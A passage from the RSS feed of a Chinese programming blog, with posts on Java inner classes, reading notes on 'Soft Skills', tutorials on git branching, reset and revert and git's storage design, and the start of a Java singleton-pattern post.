&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doRepairWork&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 内部类持有外部类的引用，访问外部类的成员变量name。
&lt;/span>&lt;span style="color:#75715e">&lt;/span> work&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doGuidWork&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 调用guider的work方法
&lt;/span>&lt;span style="color:#75715e">&lt;/span> work&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doRepairWork&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 返回一个持有外部类变量引用的内部类的对象,然后调用这个对象,实现具体的业务逻辑.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> repairerRobot&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">doRepairWork&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过对 java 内部类的合理利用，我们“模拟”出了一个闭包的程序结构。
该程序通过调用外部类对象，从而返回了一个持有外部类对象变量引用的内部类对象。当我们再次调用内部类对象的某个方法时，我们实现了具体的业务逻辑。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;ol>
&lt;li>内部类通常用来解决“多重继承”的问题。&lt;/li>
&lt;li>当你希望隐藏一个类的实现，减少工程中.java 文件数量，或者这个类不想被扩展时，你可以通过匿名内部类来创建一个类的对象。&lt;/li>
&lt;li>java 虽然无法直接在语法层面上支持闭包，但是可以通过内部类来模拟一个闭包的程序结构。&lt;/li>
&lt;/ol></description></item><item><title>软技能</title><link>https://www.chucklin.net/post/softskill/</link><pubDate>Wed, 01 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/softskill/</guid><description>&lt;h1 id="软技能读书笔记">软技能读书笔记&lt;/h1>
&lt;h2 id="前言">前言&lt;/h2>
&lt;p>近日读完了约翰森梅兹的著作《软技能-代码之外的生存指南》后受益匪浅。为便于今后对书中重要章节的内容进行反复阅读加深理解，我归纳总结了这篇读书笔记。&lt;/p>
&lt;h2 id="职业">职业&lt;/h2>
&lt;ul>
&lt;li>职业发展的驱动力一定是来自于个体本身。记住：工作是属于公司的，而职业生涯却是属于你自己的。&lt;/li>
&lt;li>把雇主当做是你的软件开发企业的客户。像一个企业一样思考问题。积极主动地管理自己的公司，提高服务品质。&lt;/li>
&lt;/ul>
&lt;h2 id="目标">目标&lt;/h2>
&lt;ul>
&lt;li>设置大目标。月度目标、周目标、日目标。&lt;/li>
&lt;/ul>
&lt;h2 id="人际交往">人际交往&lt;/h2>
&lt;ul>
&lt;li>每个人都希望自己很重要，这是人最致命的欲望之一。不要贬低别人，削弱别人。给予他人相同的礼遇，才能让别人接受你的想法。&lt;/li>
&lt;li>思考什么才是他人所需要的，避免争吵。在小事上懂得让步，才能赢得尊重，为未来积蓄财富。&lt;/li>
&lt;li>牢记严谨的推理足以使他人接受你的思维方式并不是永远正确的。人是一种情感动物。&lt;/li>
&lt;/ul>
&lt;h2 id="面试">面试&lt;/h2>
&lt;ul>
&lt;li>录用某个人总是基于各种各样的非技术因素。尽量让面试官对你有好感。&lt;/li>
&lt;li>打破常规，预先与优秀的人建立联系。提前建立联系留下好印象，你就可以赢得面试。&lt;/li>
&lt;li>面试时强调表现自己是一个自我驱动的人。&lt;/li>
&lt;/ul>
&lt;h2 id="专业">专业&lt;/h2>
&lt;ul>
&lt;li>专业化十分重要。学富五车，并在某一点上有较深入的突破与理解。&lt;/li>
&lt;/ul>
&lt;h2 id="晋升">晋升&lt;/h2>
&lt;ul>
&lt;li>学会承担责任，才能够脱颖而出。主动寻找机会，发挥自己的才能。
&lt;ol>
&lt;li>在没人愿意涉足的领域寻找机会。如开发组的服务器的整理和配置上。&lt;/li>
&lt;li>成为团队中其他人的导师，乐于帮助别人，成为及时雨。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>引人注目。让经理注意到你。在周报中体现自己的价值，并且让管理层知道你一直明白你周围的人做的事情以及进度。建立博客，参加技术聚会，抛头露面。&lt;/li>
&lt;/ul>
&lt;h2 id="专业精神">专业精神&lt;/h2>
&lt;ul>
&lt;li>坚持原则，不降低自己的开发标准。在每次会议前准备好自己演讲的内容。说话清晰有条理，把每一件小事都当成大事来对打，记录到 todo 认真完成。&lt;/li>
&lt;/ul>
&lt;h2 id="自我营销">自我营销&lt;/h2>
&lt;ul>
&lt;li>营销在于把人们期待的产品和服务与服务于产品本身联系起来。&lt;/li>
&lt;li>当你试图说服别人时你就在尝试说服他们。所以不要让他人和环境来定义我们。&lt;/li>
&lt;li>坚持写博客，并与他人分享，以及更新 github 是自我营销的关键。&lt;/li>
&lt;li>打造属于自己的品牌。归纳属于自己的品牌信息、保证品牌一致性、设计出品牌的视觉符号、曝光品牌到消费大众。&lt;/li>
&lt;li>坚持写博客，评论他人的博客。保持频率和速度更新自己的博客。打磨自己的沟通技巧，将思想转换为结构化的文字非常关键。&lt;/li>
&lt;li>尽量多的去帮助别人。帮助别人就是帮助你自己。注册属于自己的 Linked。&lt;/li>
&lt;li>不要怕被别人看作傻瓜。持之以恒总会有所回报。&lt;/li>
&lt;/ul>
&lt;h2 id="学习">学习&lt;/h2>
&lt;ul>
&lt;li>遵守 10 步学习法。当你时间不充裕时候，从头到尾阅读一整本书不是明智的选择。 10. 了解全局。明确你要学习的大概是一个什么东西，有什么用处。 11. 确定范围。明确学习的具体范围。 12. 定义目标。学习的目的是用来做什么，达成什么样的目标？ 13. 寻找资源。寻找讯息资源。 14. 创建学习计划。创建学习计划，如何学习。 15. 筛选资源。 16. 开始浅度学习。粗略阅读相关章节的概要部分和主要内容。 17. 动手操作。边实践边学习。 18. 全面掌握。上一步中发现的问题在这一步中通过查阅书籍得到解答。 19. 传道授业。只要在某一方面你比别人进步一点点，你就可以是别人的老师。&lt;/li>
&lt;li>消除自己的短板。对某些反感的抗拒的小知识点，进行归纳整理，找时间统一学习。消除生活和工作中的痛点。&lt;/li>
&lt;li>需要消耗精力和专注的事情不要多任务并行。切换任务会消耗大量资源。不需要消耗精力与专注的事情可以和需要专注的事情合理结婚，并行执行。&lt;/li>
&lt;/ul>
&lt;h2 id="努力工作马上采取行动">努力工作/马上采取行动&lt;/h2>
&lt;ul>
&lt;li>马上采取行动比为了找到最优解而花费 300%的时间更有价值。采取行动、即使它暂时不是最优解。先跑上跑道再去考虑下一个转弯。&lt;/li>
&lt;/ul>
&lt;h2 id="薪酬谈判">薪酬谈判&lt;/h2>
&lt;ul>
&lt;li>获得工作的方式决定了你在谈判时所处的地位。&lt;/li>
&lt;li>先出价者输。别要求出价时尽量多提问题，让对方给出这个职位的价位范围。&lt;/li>
&lt;li>拿到 offer 后再还一次价。在价格上最细微提升并且承诺可以马上签约。&lt;/li>
&lt;/ul>
&lt;h2 id="精神">精神&lt;/h2>
&lt;ul>
&lt;li>积极面对失败，不要畏惧失败、拥抱失败、期待失败、接受失败、直面失败。&lt;/li>
&lt;li>主动寻找失败，即使全世界都认为你是一个傻瓜。脱离自己的舒适区，才能成长的更快。&lt;/li>
&lt;li>不要把他人的话当成福音。&lt;/li>
&lt;/ul></description></item><item><title>git 中的分支</title><link>https://www.chucklin.net/post/git_branch/</link><pubDate>Sat, 01 Jun 2019 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/git_branch/</guid><description>&lt;h2 id="git-如何存储数据">Git 如何存储数据&lt;/h2>
&lt;p>Git 仓库中包含了三种对象：blob 对象、tree object、commit object。三种对象共同组成 git 仓库中的提交记录。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">&lt;span style="color:#75715e"># add file to workspace&lt;/span>
vim gitbranchA.txt
vim gitbranchB.txt
vim gitbranchC.txt
&lt;span style="color:#75715e"># 暂存操作会为目录下每个文件计算校验和，并生成相应的 tree object 的树对象并存放到仓库中。&lt;/span>
git add .
&lt;span style="color:#75715e"># 生成一个持有指向 tree object 对象的指针的提交对象。&lt;/span>
git commit -m &lt;span style="color:#e6db74">&amp;#39;initial commit of branch&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/commit-and-tree.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>假设你现在又做了一些更改并进行了一次提交，那么第二次提交就会保存着指向它上一次提交的指针。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/commits-and-parents.png" alt="此处输入图片的描述">&lt;/p>
&lt;h2 id="分支是什么">分支是什么&lt;/h2>
&lt;p>git 的分支只不过是一个指向某次对象的指针。无论指针的名称叫做 master 还是 dev，他们在 git 内部都以指针的形式存在，没有任何区别。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/branch-and-history.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>当你使用&lt;code>git branch testing&lt;/code> 创建一个分支时，将会创建一个新的指针指向当前你所在分支指向的提交对象上。注意上图中叫做 HEAD 的特殊指针。和其他指针不同，HEAD 是一个指向指针的指针。HEAD 指针中存放的指针内存地址，即代表了你目前所在的分支。
&lt;img src="https://git-scm.com/book/en/v2/images/two-branches.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>现在我们切换到 testing 分支，并进行一系列的提交。&lt;/p>
&lt;pre tabindex="0">&lt;code>git checkout testing
vim test.rb
git commit - a -m 'made a change'
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/advance-testing.png" alt="此处输入图片的描述">
情况开始变得有趣了：testing 分支已经向前移动，而 master 分支依然指向移动之前的提交对象。换言之，目前 master 分支指向的提交对象，是 testing 分支指向的提交对象的父提交对象。&lt;/p>
&lt;p>现在让我们切换回 master 分支，做出一些改动并再次提交一次。&lt;/p>
&lt;pre tabindex="0">&lt;code>git checkout master
vim test.rb
git commit -a -m 'made other changes'
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/checkout-master.png" alt="此处输入图片的描述">
&lt;img src="https://git-scm.com/book/en/v2/images/advance-master.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>从现在开始。项目历史产生了分叉。可见，改变分支指针指向的提交对象，就能轻而易举的在各个不同的分支之间进行切换。而其他版本控制系统缺乏类似的轻量级的分支切换开销特性。&lt;/p>
&lt;h2 id="什么时候需要将分支合并">什么时候需要将分支合并？&lt;/h2>
&lt;p>试想目以下图示中的工作场景。你正在 iss53 号分支上进行着开发工作。突然，业务人员反馈线上出现了一个紧急问题需要修复。
于是你基于 master 分支建立了 hotfix 分支，并将补丁开发完毕。剩下的只要将 hotfix 分支合并回 master 分支，即可大功告成了。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/basic-branching-4.png" alt="此处输入图片的描述">&lt;/p>
&lt;pre tabindex="0">&lt;code>git checkout master
git merge hotfix
Updating f42c576..3a0874c
Fast-forward
index.html | 2 ++
1 file changed, 2 insertions(+)
&lt;/code>&lt;/pre>&lt;p>在 master 分支上使用 &lt;code>git merge hotfix&lt;/code> 即可将 hotfix 分支合并回 master。你会注意到合并时出现了 fast-forward 的提示。由于当前所在分支 master 所指向的提交对象，是待合并分支 hotfix 所指向的提交对象父提交对象。
所以，对于顺着其中一个提交历史可以直达另一个提交提交历史的合并请求，git 会把分支指针向前移动。这种单线历史合并操作不存在分歧。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/basic-branching-5.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>关于这个紧急问题的解决方案发布之后，你准备回到被打断之前时的工作中。然而，你应该先删除 hotfix 分支，因为你已经不再需要它了 —— master 分支已经指向了同一个位置。&lt;/p>
&lt;pre tabindex="0">&lt;code>git branch -d hotfix
&lt;/code>&lt;/pre>&lt;p>现在你可以切换回你正在工作的分支继续你的工作，也就是针对 #53 问题的那个分支(iss53 分支)。
时光飞逝，iss53 的开发工作正式完成。你打算将其合并回 master 分支。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ git checkout master
Switched to branch 'master'
$ git merge iss53
Merge made by the 'recursive' strategy.
index.html | 1 +
1 file changed, 1 insertion(+)
&lt;/code>&lt;/pre>&lt;p>很显然，这和你之前合并 hotfix 分支的时候看起来有一点不一样。
在这种情况下，你的开发历史从一个更早的地方开始分叉开来(diverged)。 因为 master 分支所在的提交并不是 iss53 分支所在提交的直接祖先，Git 不得不做一些额外的工作。 出现这种情况的时候，Git 会使用两个分支的末端所指的快照（C4 和 C5）以及这两个分支的工作祖先（C2），做一个简单的三方合并。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/basic-merging-1.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>和之前将分支指针向前推进所不同的是，Git 将此次三方合并的结果做了一个新的快照并且自动创建一个新的提交指向它。 这个被称作一次合并提交，它的特别之处在于他有不止一个父提交。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/basic-merging-2.png" alt="此处输入图片的描述">&lt;/p>
&lt;h3 id="合并请求产生冲突的原因">合并请求产生冲突的原因&lt;/h3>
&lt;p>当合并请求产生三方合并操作时，git 并不会自作聪明的帮助你判断在应该以哪一方的信息为准。只要待合并的 2 个分支针对同一个文件的同一个位置有改动，git 就没办法帮助你自动进行处理。此时，就产生了合并冲突，需要用户自行解决。&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD:index.html
&amp;lt;div id=&amp;quot;footer&amp;quot;&amp;gt;contact : email.support@github.com&amp;lt;/div&amp;gt;
=======
&amp;lt;div id=&amp;quot;footer&amp;quot;&amp;gt;
please contact us at support@github.com
&amp;lt;/div&amp;gt;
&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; iss53:index.html
&lt;/code>&lt;/pre>&lt;h2 id="什么是远程分支">什么是远程分支&lt;/h2>
&lt;p>刚接触远程分支这个概念时，容易被 remote 这个词汇所误导。实际上，远程分支就是一个存在于本地的，指向某个提交对象的特殊指针而已。你只能合并或者基于远程分支创建副本。
简而言之，远程分支是一个你无法直接在上面工作的普通分支。&lt;/p>
&lt;h4 id="远程指针特殊在哪里">远程指针特殊在哪里？&lt;/h4>
&lt;p>远程分支的表现形式是&lt;code>(remote)/(branch)&lt;/code>。当你将数据从服务器上克隆到本地时，clone 命令会将服务器所有的分支指针拉取到本地，并在本地创建一个指向服务器上 master 分支的分支，并取名为：&lt;code>orgin/master&lt;/code>。同时，git 也会帮你创建你自己的本地 master 分支。这个分支和 &lt;code>orgin/master&lt;/code> 分支在最开始是指向同样的位置，这样你就可以在上面开始工作了。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/remote-branches-1.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>如果你在本地的 master 分支做了一些工作，然而在同一时间，其他人推送提交到 git.ourcompany.com 并更新了它的 master 分支，同时，你又使用 &lt;code>git fetch origin&lt;/code> 命令同步了远程服务器的数据。那么现在你的分支就会像是下面这样。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/remote-branches-3.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>这和本地分支产生历史分叉没什么区别。唯一不同的是，你无法直接切换到 &lt;code>orgin/master&lt;/code> 分支下进行工作，仅此而已。
如果你想要把 &lt;code>origin/master&lt;/code> 远程分支所指向的提交对象的内容，反应到你本地的 master 分支的工作空间中，只需要通过合并或者&lt;code>pull&lt;/code>的方式，将 &lt;code>origin/master&lt;/code> 合并即可。&lt;/p>
&lt;pre tabindex="0">&lt;code>git merge origin/master
&lt;/code>&lt;/pre>&lt;p>同时你也可以基于远程分支，创建自己的本地分支，以便在其上工作。&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;p>git 中的切换分支其实就是改写 HEAD 指针文件中的内容。这样的设计思想，使得其他版本控制系统中费时费力的分支切换到了 git 中变得易如反掌。低廉的分支切换开销，使得在不同的分支上进行快速切换，迅速应对问题的工作方式成为了可能。&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://www.progit.cn">《精通 Git pro 第二版》&lt;/a>&lt;/p></description></item><item><title>git 中的撤回机制</title><link>https://www.chucklin.net/post/git_revert_reset/</link><pubDate>Sat, 01 Jun 2019 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/git_revert_reset/</guid><description>&lt;h2 id="reset">Reset&lt;/h2>
&lt;p>假设目前我们处于下图所示的工作场景中。我们正在 master 分支上进行工作。目前工作目录是干净的，这意味着暂存索引区中的文件内容与工作目录是一致的。并且，HEAD 指向的 master 分支指向的提交对象，也和目前工作空间中的文件内容保持一致。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/reset-start.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>现在，让我们来一步步看看 reset 命令究竟做了些什么。&lt;/p>
&lt;h4 id="第一步移动-head">第一步：移动 HEAD&lt;/h4>
&lt;p>reset 做的第一件事是移动 HEAD 的指向。 这与改变 HEAD 自身不同（checkout 所做的）；reset 移动 HEAD 指向的分支。 这意味着如果 HEAD 设置为 master 分支（例如，你正在 master 分支上），运行 git reset 9e5e64a 将会使 master 指向 9e5e64a。
使用 rest 命令将 HEAD 指向的 master 重置到其父提交对象。
&lt;code>git reset --soft HEAD~&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/reset-soft.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>再强调一次，checkout 命令修改的是 HEAD 分支变量保存的地址内容，而 reset 命令是修改的 HEAD 分支所指向的分支变量中保存的地址内容。到目前为止，reset 命令实际上撤销了最近一次的 git commit 命令。&lt;/p>
&lt;h4 id="第二步更新暂存区">第二步：更新暂存区&lt;/h4>
&lt;p>如果你现在执行 &lt;code>git status&lt;/code> 你会看到 git 提示你当前暂存区的变动有差异，需要进行提交。现在，reset 要做的下一件事是使用 HEAD 当前所指向的快照的内容来更新索引。&lt;/p>
&lt;p>&lt;img src="https://git-scm.com/book/en/v2/images/reset-mixed.png" alt="此处输入图片的描述">&lt;/p>
&lt;h4 id="第三步更新工作目录">第三步：更新工作目录&lt;/h4>
&lt;p>reset 要做的的第三件事情就是让工作目录看起来像索引。 如果使用 &amp;ndash;hard 选项，它将会继续这一步。
&lt;img src="https://git-scm.com/book/en/v2/images/reset-hard.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>现在让我们回想一下刚才发生的事情。你撤销了最后的提交、git add 和 git commit 命令以及工作目录中的所有工作。如果现在使用 &lt;code>git log&lt;/code>查看 git 的提交记录，就会发现 reset 目标分支之后的提交记录全都消失了。&lt;/p>
&lt;p>当客户端尝试将 reset 过后的版本内容推送到远端时，会被服务器拒绝并提示本地的版本落后于远端的版本。这很容易理解，因为你本地的分支指针指向的提交对象是远程仓库中的对应指针指向的提交对象的父提交对象。为了覆盖掉远端信息，你需要在命令的后面加上 &amp;ndash;force 参数。&lt;/p>
&lt;pre tabindex="0">&lt;code>git push origin &amp;lt;分支名&amp;gt; --force
&lt;/code>&lt;/pre>&lt;h2 id="revert">Revert&lt;/h2>
&lt;p>revert 命令可以生成一个新的提交，撤销已有提交的所有变更。这样的操作被称为还原。&lt;/p>
&lt;pre tabindex="0">&lt;code>git revert -m 1 HEAD
&lt;/code>&lt;/pre>&lt;p>-m 1 标记指出 “mainline” 需要被保留下来的父结点。 当你引入一个合并到 HEAD（git merge topic），新提交有两个父结点：第一个是 HEAD（C6），第二个是将要合并入分支的最新提交（C4）。 在本例中，我们想要撤消所有由父结点 #2（C4）合并引入的修改，同时保留从父结点 #1（C4）开始的所有内容。&lt;/p>
&lt;p>有还原提交的历史看起来像这样：
&lt;img src="https://git-scm.com/book/en/v2/images/undomerge-revert.png" alt="此处输入图片的描述">&lt;/p>
&lt;p>新的提交 ^M 与 C6 有完全一样的内容，所以从这儿开始就像合并从未发生过，除了“现在还没合并”的提交依然在 HEAD 的历史中。 如果你尝试再次合并 topic 到 master Git 会感到困惑：&lt;/p>
&lt;pre tabindex="0">&lt;code>git merge topic
Already up-to-date.
&lt;/code>&lt;/pre>&lt;p>topic 中并没有东西不能从 master 中追踪到达。 更糟的是，如果你在 topic 中增加工作然后再次合并，Git 只会引入被还原的合并 之后 的修改。
&lt;img src="https://git-scm.com/book/en/v2/images/undomerge-revert2.png" alt="此处输入图片的描述">&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>&lt;code>git reset&lt;/code>命令是一次对版本信息的清洗和回退。通过移动指针指向的内容达成回退版本，并且覆盖掉相应的历史信息的目的。这种重写历史记录的特性，可能会在使用远程仓库时造成问题。&lt;/p>
&lt;p>假设在合并之后，远程仓库又创建了其他提交，那么你的强制提交可能就会洗掉别人的提交记录。所以如果你重写的他人的提交，那就应该避免使用 reset 。&lt;/p>
&lt;p>&lt;code>git revert &lt;/code>命令是通过使用老的内容，产生一次新的提交以达到覆盖老的提交内容的目的。revert 命令不会覆盖历史记录，相对 reset 命令更加的安全。&lt;/p>
&lt;p>唯一需要注意的是，revert 过后的提交对象由于在分支历史上处于时间线的前列。这就造成了凡是属于此提交对象的父对象的历史信息，都无法被合并到 revert 过后的提交对象上。&lt;/p>
&lt;h2 id="建议">建议&lt;/h2>
&lt;p>虽然根据不同的业务情况选择不同的命令往往是正确做法。但是鉴于 reset 命令会重写历史记录的特性，当你想要撤销某次提交时，请慎重使用 reset 命令。&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://www.progit.cn">《精通 Git pro 第二版》&lt;/a>&lt;/p></description></item><item><title>为什么 git 与众不同</title><link>https://www.chucklin.net/post/git/</link><pubDate>Sat, 01 Jun 2019 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/git/</guid><description>&lt;h2 id="关于版本控制系统">关于版本控制系统&lt;/h2>
&lt;blockquote>
&lt;p>按照时间顺序记录某一系列的文件的变更，使其可以查看以前的特定版本的软件，我们称之为版本控制系统。&lt;/p>
&lt;/blockquote>
&lt;p>简单来讲：创建两个文件夹，在两个文件夹中分别保存一月份与二月份的销售数据，这样就创建了一个简单且稳定的版本控制系统。&lt;/p>
&lt;h2 id="常见的版本控制系统">常见的版本控制系统&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>RCS
在 MacOS 上，只要你安装了开发者工具，就会包含一个 rcs 命令。RCS 会在磁盘上以一种特殊的格式保存补丁集。当你需要某个版本的内容时，我们通过叠加补丁集，来恢复到某个历史的状态。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Subversion
和 RCS 类似，Subversion 在中央服务器上保存了每个版本的 patch set。当用户进行检出时，我们检出的实际上是检出版本对应的补丁集数据。显而易见：如果中央服务器发生异常，将导致检出与提交功能无法使用，继而造成版本控制系统的瘫痪。
&lt;img src="http://static.zybuluo.com/mikumikulch/2xrryaxeign3sgc7bpfoaemh/image_1chq621f670k16341mlg11vq1cm9.png" alt="image_1chq621f670k16341mlg11vq1cm9.png-76.7kB">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="为什么-git-与众不同">为什么 Git 与众不同？&lt;/h2>
&lt;h3 id="其他版本控制系统的文件存储设计">其他版本控制系统的文件存储设计&lt;/h3>
&lt;p>Git 与上述版本控制系统最大的不同在于其对待数据的方式。概念上来区分，其它大部分系统以文件变更列表的方式存储信息。 这类系统（CVS、Subversion、Perforce、Bazaar 等等）将它们保存的信息看作是一组基本文件和每个文件随时间逐步累积的差异。&lt;/p>
&lt;ul>
&lt;li>Version1 保存了 3 个文件 A、B、C。&lt;/li>
&lt;li>Version2 File A 与 File C 发生了变化，版本控制系统将变化的补丁集保存下来。File B 未发生任何变化。&lt;/li>
&lt;/ul>
&lt;p>如下图所示：当需要恢复到某个历史版本时，需要从中央服务器上拉去补丁集，并叠加恢复到某一时间段的状态。&lt;/p>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/quu8nyfmm9jm4lfswnubdrtu/image_1chq6i57hc9vu66n8e1s9t1dhsm.png" alt="image_1chq6i57hc9vu66n8e1s9t1dhsm.png-57.5kB">&lt;/p>
&lt;h3 id="git-版本控制系统的文件存储设计">Git 版本控制系统的文件存储设计&lt;/h3>
&lt;p>Git 不按照以上方式对待或保存数据。 反之，Git 更像是把数据看作是对小型文件系统的一组快照。 每次你提交更新，或在 Git 中保存项目状态时，它主要对当时的全部文件制作一个快照并保存这个快照的索引。 为了高效，如果文件没有修改，Git 不再重新存储该文件，而是只保留一个链接指向之前存储的文件。 Git 对待数据更像是一个&lt;strong>快照流&lt;/strong>。&lt;/p>
&lt;ul>
&lt;li>Version1 保存了 3 个名称为 A、B、C 的文件。&lt;/li>
&lt;li>Version2 文件 A、C 发生了变化，版本保存了变化后的文件。文件 B 没有发生任何变化，版本保留了一个指向 File B 的链接。&lt;/li>
&lt;/ul>
&lt;p>由于 Git 的快照同步机制，只需要同步一次服务器上的版本数据信息，即可在本地恢复到任何一个版本。另外，无论哪一台客户机的数据发生了丢失，都可以随时同步其他客户机的数据恢复作业，这就是&lt;strong>分布式&lt;/strong>的含义。从本质上来说，Git 不再是一种一个单纯的版本控制系统，而更像是一个微型文件系统。&lt;/p>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/lpanpn8zhg3qxd9i4jtyfzzk/image_1chs2vjah1ul613llmp91270ru213.png" alt="image_1chs2vjah1ul613llmp91270ru213.png-74.1kB">&lt;/p>
&lt;h5 id="git-的完整性校验">Git 的完整性校验&lt;/h5>
&lt;p>在计算机中，哈希算法经常用来做签名校验，以保证内容的完整性，Git 也一样。
在 Git 中所有数据在存储前都计算校验和，然后以校验和来引用。Git 用来计算校验和的机制叫做 SHA-1 散列（hash，哈希）。 基于 Git 中文件的内容或目录结构计算出来。 SHA-1 哈希看起来是这样&lt;/p>
&lt;pre tabindex="0">&lt;code>24b9da6552252987aa493b52f8696cd6d3b00373
&lt;/code>&lt;/pre>&lt;p>Git 数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;p>简单总结一下本章的内容：&lt;/p>
&lt;ul>
&lt;li>传统的版本控制系统，保存的是文件变化的补丁集。&lt;/li>
&lt;li>分布式文件系统 Git 保存的是文件的快照流，不是变化的补丁集。&lt;/li>
&lt;li>Git 使用 hash 算法来对文件进行引用。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>&lt;a href="https://www.progit.cn">《精通 Git pro 第二版》&lt;/a>&lt;/p></description></item><item><title>单例设计模式</title><link>https://www.chucklin.net/post/sign_designmode/</link><pubDate>Mon, 01 Oct 2018 18:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/sign_designmode/</guid><description>&lt;p>单例设计模式是应用最广泛的设计模式，没有之一。当我们需要控制一个类只能被创建出单个对象时，就可以采用单例设计模式。
使用 java 来实现单例设计模式，普遍有四种实现方式。&lt;/p>
&lt;ul>
&lt;li>懒汉式&lt;/li>
&lt;li>饿汉式&lt;/li>
&lt;li>双检锁&lt;/li>
&lt;li>innerclass holder&lt;/li>
&lt;/ul>
&lt;h2 id="怎么用">怎么用？&lt;/h2>
&lt;h3 id="懒汉式">懒汉式&lt;/h3>
&lt;p>懒汉式是最常见的单例设计模式的实现方式之一。懒汉代表的含义为 lazy-load，意味着当单例对象在项目中真正被某个业务模块使用时，对象才会被创建。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#f92672">package&lt;/span> com.designpattern.singleton&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 单例设计模式-懒汉式
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SingletonLazyMode&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SingletonLazyMode shm&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 私有化构造器
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">SingletonLazyMode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 获取单例
